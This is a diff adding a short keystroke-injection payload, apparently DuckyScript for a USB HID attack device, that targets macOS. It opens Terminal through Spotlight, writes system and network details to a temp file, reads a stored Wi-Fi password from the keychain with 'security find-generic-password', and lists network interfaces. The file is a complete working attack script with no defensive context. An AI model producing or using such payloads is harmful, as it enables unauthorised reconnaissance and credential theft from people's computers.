@@ -1,0 +1,17 @@
+DELAY 1000
+GUI SPACE
+DELAY 600
+STRING terminal
+ENTER
+DELAY 1000
+STRING system_profiler SPSoftwareDataType SPHardwareDataType SPNetworkDataType 2>&1 | tee /tmp/px_mac_sys.txt
+ENTER
+DELAY 2000
+STRING security find-generic-password -ga "Airport" 2>&1 | grep password
+ENTER
+DELAY 500
+STRING networksetup -listallnetworkservices
+ENTER
+DELAY 500
+STRING ifconfig
+ENTER
